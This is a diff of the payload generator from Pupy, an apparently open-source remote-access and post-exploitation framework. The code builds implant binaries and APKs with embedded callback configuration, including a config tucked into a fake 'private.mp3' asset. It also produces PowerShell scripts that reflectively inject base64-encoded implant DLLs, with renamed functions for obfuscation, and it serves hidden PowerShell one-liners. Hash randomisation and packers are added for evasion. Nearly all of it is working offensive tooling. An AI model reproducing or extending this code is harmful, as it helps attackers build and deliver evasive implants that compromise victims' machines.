@@ -1,4 +1,4 @@
-#!/usr/bin/python -O
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
@@ -6,7 +6,7 @@
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.term import colorize
-from pupylib.payloads.python_packer import gen_package_pickled_dic
+from pupylib.payloads import dependencies
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
@@ -14,7 +14,7 @@ from pupylib.PupyConfig import PupyConfig
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
-from modules.lib.windows.powershell_upload import obfuscatePowershellScript
+from modules.lib.windows.powershell import obfuscatePowershellScript
 from pupylib.PupyCredentials import Credentials, EncryptionError
 from pupylib import PupyCredentials
 from pupylib.PupyVersion import __version__
@@ -27,22 +27,15 @@ import os
 import pylzma
 import struct
 import getpass
+import string
+import random
 import json
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
-HARDCODED_CONF_SIZE=32768
-
-def check_templates_version():
-    try:
-        with open(os.path.join(ROOT, "payload_templates", "version.txt"), 'r') as f:
-            v=f.read().strip()
-    except:
-        v="0.0"
-    if v != __version__:
-        logging.warning("Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"")
+HARDCODED_CONF_SIZE=65536
 
 
-def get_edit_binary(path, conf):
+def get_edit_binary(path, conf, compressed_config=True):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
     with open(path, 'rb') as f:
@@ -60,13 +53,13 @@ def get_edit_binary(path, conf):
     elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<string>', 'exec'))
+    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<config>', 'exec'))
     uncompressed = len(new_conf)
-    new_conf = pylzma.compress(new_conf)
+    if compressed_config:
+        new_conf = pylzma.compress(new_conf)
     compressed = len(new_conf)
     new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
     new_conf_len = len(new_conf)
-
 
     if new_conf_len > HARDCODED_CONF_SIZE:
         raise Exception(
@@ -75,6 +68,8 @@ def get_edit_binary(path, conf):
         )
 
     new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+
+    logging.debug('Free space: {}'.format(HARDCODED_CONF_SIZE-new_conf_len))
 
     offset = offsets[0]
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
@@ -125,6 +120,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
 
     if verbose:
         for k, v in conf.iteritems():
+            if k in ('offline_script'):
+                continue
+
             print colorize("[C] {}: {}".format(k, v), "yellow")
 
     config = '\n'.join([
@@ -132,12 +130,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
             repr(cPickle.dumps({
                 'pupy_credentials.py' : embedded_credentials
             }))),
-        '\n'.join([
-            'pupyimporter.pupy_add_package({})'.format(
-                repr(cPickle.dumps(gen_package_pickled_dic(
-                    ROOT+os.sep, 'network.transports.{}'.format(transport)
-                    )))) for transport in transports_list
-        ]),
+        dependencies.importer(set(
+            'network.transports.{}'.format(transport) for transport in transports_list
+        ), path=ROOT),
         'import sys',
         'sys.modules.pop("network.conf")',
         'import network.conf',
@@ -193,7 +188,7 @@ def updateTar(arcpath, arcname, file_path):
     finally:
         shutil.rmtree(tempdir)
 
-def get_edit_apk(path, conf):
+def get_edit_apk(path, conf, compressed_config=None):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
@@ -212,7 +207,7 @@ def get_edit_apk(path, conf):
 
         print "[+] packaging the apk ... (can take 10-20 seconds)"
         #updating the tar with the new config
-        updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
+        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir,"pp.pyo"))
         #repacking the tar in the apk
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(tempapk, "assets/private.mp3", t.read())
@@ -235,8 +230,86 @@ def get_edit_apk(path, conf):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None):
-    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}.{ext}'
+def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x86=False):
+    
+    SPLIT_SIZE = 100000
+    x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
+    
+    if not outpath:
+        outfile = tempfile.NamedTemporaryFile(
+            dir=output_dir or '.',
+            prefix='pupy_',
+            suffix='.ps1',
+            delete=False
+        )
+    else:
+        try:
+            os.unlink(outpath)
+        except:
+            pass
+
+        outfile = open(outpath, 'w+b')
+
+    outpath = outfile.name
+
+    if both:
+        code = """
+        $PEBytes = ""
+        if ([IntPtr]::size -eq 4){{
+            {0}
+            $PEBytesTotal = [System.Convert]::FromBase64String({1})
+        }}
+        else{{
+            {2}
+            $PEBytesTotal = [System.Convert]::FromBase64String({3})
+        }}
+        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
+        """ # {1} = x86dll, {3} = x64dll
+    else:
+        code = """
+        {0}
+        $PEBytesTotal = [System.Convert]::FromBase64String({1})
+        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
+        """
+
+    if both or x64:
+        # generate x64 ps1 
+        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
+        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
+        for i, aPart in enumerate(binaryX64parts):
+            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
+            x64ConcatCode += "$PEBytes{0}+".format(i)
+        print(colorize("[+] ","green") + "X64 dll loaded and {0} variables used".format(i + 1))
+
+    if both or x86:
+        # generate x86 ps1 
+        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
+        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
+        for i, aPart in enumerate(binaryX86parts):
+            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
+            x86ConcatCode += "$PEBytes{0}+".format(i)
+        print(colorize("[+] ","green") + "X86 dll loaded and {0} variables used".format(i + 1))
+    
+    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
+    
+    # adding some more obfuscation
+    random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
+    script      = script.replace('Invoke-ReflectivePEInjection', random_name)
+    code        = code.replace('Invoke-ReflectivePEInjection', random_name)
+
+    if both:
+        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1])))
+    elif x64:
+        outfile.write("{0}\n{1}".format(script, code.format(x64InitCode, x64ConcatCode[:-1])))
+    elif x86:
+        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))
+
+    outfile.close()
+
+    return outpath
+
+def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
+    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
     ARCH_CONVERT = {
         'amd64': 'x64', 'x86_64': 'x64',
         'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
@@ -262,7 +335,14 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     CLIENTS = {
         'android': (get_edit_apk, 'pupy.apk', False),
         'linux': (get_edit_binary, TEMPLATE_FMT, True),
+        'solaris': (get_edit_binary, TEMPLATE_FMT, True),
         'windows': (get_edit_binary, TEMPLATE_FMT, False),
+    }
+
+    SUFFIXES = {
+        'windows': ( 'exe', 'dll' ),
+        'linux':   ( 'lin', 'lin.so' ),
+        'solaris': ( 'sun', 'sun.so' ),
     }
 
     osname = osname.lower()
@@ -276,26 +356,40 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     if '{arch}' in template and not arch:
         raise ValueError('arch required for the target OS ({})'.format(osname))
 
-    shared_ext = 'dll' if osname == 'windows' else 'so'
-    non_shared_ext = 'exe' if osname == 'windows' else 'lin'
-    ext = shared_ext if shared else non_shared_ext
+    shared_ext = 'xxx'
+    non_shared_ext = 'xxx'
+
+    if osname in SUFFIXES:
+        non_shared_ext, shared_ext = SUFFIXES[osname]
+
     debug = 'd' if debug else ''
 
     if shared:
         makex = False
+        ext = shared_ext
+    else:
+        ext = non_shared_ext
 
-    filename = template.format(arch=arch, debug=debug, ext=ext)
+    filename = template.format(arch=arch, debug=debug, ext=ext, unk='.unc' if not compressed else '')
     template = os.path.join(
-        ROOT, 'payload_templates', filename
+        'payload_templates', filename
     )
+
+    if not os.path.isfile(template):
+        template = os.path.join(
+            ROOT, 'payload_templates', filename
+        )
 
     if not os.path.isfile(template):
         raise ValueError('Template not found ({})'.format(template))
 
     for k, v in config.iteritems():
+        if k in ('offline_script'):
+            continue
+
         print colorize("[C] {}: {}".format(k, v), "yellow")
 
-    return generator(template, config), filename, makex
+    return generator(template, config, compressed), filename, makex
 
 def load_scriptlets():
     scl={}
@@ -311,9 +405,9 @@ def load_scriptlets():
                         scl[module_name]=module2.ScriptletGenerator
     return scl
 
-def parse_scriptlets(args_scriptlet, debug=False):
-    scriptlets_dic=load_scriptlets()
-    sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
+def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
+    scriptlets_dic = load_scriptlets()
+    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
     for sc in args_scriptlet:
         tab=sc.split(",",1)
         sc_args={}
@@ -377,7 +471,7 @@ PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
 ]
 
-CLIENT_OS = [ 'android', 'windows', 'linux' ]
+CLIENT_OS = [ 'android', 'windows', 'linux', 'solaris' ]
 CLIENT_ARCH = [ 'x86', 'x64' ]
 
 def get_parser(base_parser, config):
@@ -388,6 +482,9 @@ def get_parser(base_parser, config):
                             choices=CLIENT_OS, help='Target OS (default: windows)')
     parser.add_argument('-A', '--arch', default=config.get('gen', 'arch'),
                             choices=CLIENT_ARCH, help='Target arch (default: x86)')
+    parser.add_argument('-U', '--uncompressed', default=False, action='store_true',
+                            help='Use uncompressed template')
+    parser.add_argument('-P', '--packer', default=config.get('gen', 'packer'), help='Use packer')
     parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
     parser.add_argument('-o', '--output', help="output path")
     parser.add_argument('-D', '--output-dir', default=config.get('gen', 'output'), help="output folder")
@@ -397,7 +494,9 @@ def get_parser(base_parser, config):
                             action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
-    parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by oneliner listeners ps1,py (default: %(default)s)")
+    parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner locally (default: %(default)s)")
+    parser.add_argument('--oneliner-no-ssl', default=False, action='store_true', help="No ssl for ps1_oneliner stages (default: %(default)s)")
+    parser.add_argument('--oneliner-nothidden', default=False, action='store_true', help="Powershell script not hidden target side (default: %(default)s)")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
     parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
     parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
@@ -410,7 +509,6 @@ def get_parser(base_parser, config):
     parser.add_argument(
         'launcher_args', default=config.get('gen', 'launcher_args'),
         nargs=argparse.REMAINDER, help="launcher options")
-    check_templates_version()
     return parser
 
 def pupygen(args, config):
@@ -421,7 +519,12 @@ def pupygen(args, config):
 
     script_code=""
     if args.scriptlet:
-        script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
+        script_code=parse_scriptlets(
+            args.scriptlet,
+            os=args.os,
+            arch=args.arch,
+            debug=args.debug_scriptlets
+        )
 
 
     l = launchers[args.launcher]()
@@ -438,9 +541,12 @@ def pupygen(args, config):
 
                 print(colorize("[!] required argument missing, automatically adding parameter "
                                    "--host {}:{} from local or external ip address".format(myip, myport),"grey"))
-                args.launcher_args = [
-                    '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
-                ]
+                if "-t" in args.launcher_args or "--transport" in args.launcher_args:
+                    args.launcher_args += ['--host', '{}:{}'.format(myip, myport)]
+                else:
+                    args.launcher_args = [
+                        '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
+                    ]
             elif str(e).strip().endswith('--domain is required') and not '--domain' in args.launcher_args:
                 domain = config.get('pupyd', 'dnscnc').split(':')[0]
                 if not domain or '.' not in domain:
@@ -461,18 +567,21 @@ def pupygen(args, config):
             break
     if args.randomize_hash:
         script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
+    
     conf={}
     conf['launcher']=args.launcher
     conf['launcher_args']=args.launcher_args
     conf['offline_script']=script_code
     conf['debug']=args.debug
     outpath=args.output
+    
     if args.format=="client":
         print ok+"Generate client: {}/{}".format(args.os, args.arch)
 
         data, filename, makex = generate_binary_from_template(
             conf, args.os,
-            arch=args.arch, shared=args.shared, debug=args.debug
+            arch=args.arch, shared=args.shared, debug=args.debug,
+            compressed=not ( args.uncompressed or args.packer )
         )
 
         if not outpath:
@@ -495,7 +604,13 @@ def pupygen(args, config):
         outfile.close()
 
         if makex:
-            os.chmod(outfile.name, 0511)
+            os.chmod(outfile.name, 0711)
+
+        if args.packer:
+            subprocess.check_call(
+                args.packer.replace('%s', outfile.name),
+                shell=True
+            )
 
         outpath = outfile.name
 
@@ -530,62 +645,36 @@ def pupygen(args, config):
         i=conf["launcher_args"].index("--host")+1
         link_ip=conf["launcher_args"][i].split(":",1)[0]
         serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
+    
     elif args.format=="ps1":
-        SPLIT_SIZE = 100000
-        x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
-        if not outpath:
-            outfile = tempfile.NamedTemporaryFile(
-                dir=args.output_dir or '.',
-                prefix='pupy_',
-                suffix='.ps1',
-                delete=False
-            )
-        else:
-            try:
-                os.unlink(outpath)
-            except:
-                pass
-
-            outfile = open(outpath, 'w+b')
-
-        outpath = outfile.name
-
-        code = """
-        $PEBytes = ""
-        if ([IntPtr]::size -eq 4){{
-            {0}
-            $PEBytesTotal = [System.Convert]::FromBase64String({1})
-        }}
-        else{{
-            {2}
-            $PEBytesTotal = [System.Convert]::FromBase64String({3})
-        }}
-        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
-        """#{1}=x86dll, {3}=x64dll
-        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
-        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
-        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
-        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
-        for i,aPart in enumerate(binaryX86parts):
-            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
-            x86ConcatCode += "$PEBytes{0}+".format(i)
-        print(ok+"X86 dll loaded and {0} variables used".format(i+1))
-        for i,aPart in enumerate(binaryX64parts):
-            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
-            x64ConcatCode += "$PEBytes{0}+".format(i)
-        print(ok+"X64 dll loaded and {0} variables used".format(i+1))
-        script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
-        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
-        outfile.close()
+        outpath = generate_ps1(conf, outpath=outpath, output_dir=args.output_dir, both=True)
+    
     elif args.format=="ps1_oneliner":
-        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
-        link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
-        if args.no_use_proxy == True:
-            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=False)
+        if conf['launcher'] in ["connect", "auto_proxy"]:
+            from pupylib.payloads.ps1_oneliner import serve_ps1_payload
+            link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
+            if args.oneliner_no_ssl == False : sslEnabled = True
+            else: sslEnabled = False
+            if args.no_use_proxy == False : useTargetProxy = True
+            else: useTargetProxy = False
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
+        elif conf['launcher'] == "bind":
+            from pupylib.payloads.ps1_oneliner import send_ps1_payload
+            print conf["launcher_args"]
+            print conf
+            outpath, target_ip, bind_port = "", None, None
+            bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
+            if "--oneliner-host" in conf["launcher_args"]:
+                target_ip=conf["launcher_args"][conf["launcher_args"].index("--oneliner-host")+1]
+                send_ps1_payload(conf, bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
+            else:
+                raise ValueError("You have to give me the --oneliner-host argument")
         else:
-            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=True)
+            raise ValueError("ps1_oneliner with {0} mode is not implemented yet".format(conf['launcher']))
+    
     elif args.format=="rubber_ducky":
         rubber_ducky(conf).generateAllForOStarget()
+    
     else:
         raise ValueError("Type %s is invalid."%(args.format))
 
@@ -596,7 +685,6 @@ def pupygen(args, config):
 
 if __name__ == '__main__':
     Credentials.DEFAULT_ROLE = 'CLIENT'
-    check_templates_version()
     config = PupyConfig()
     parser = get_parser(argparse.ArgumentParser, config)
     try:
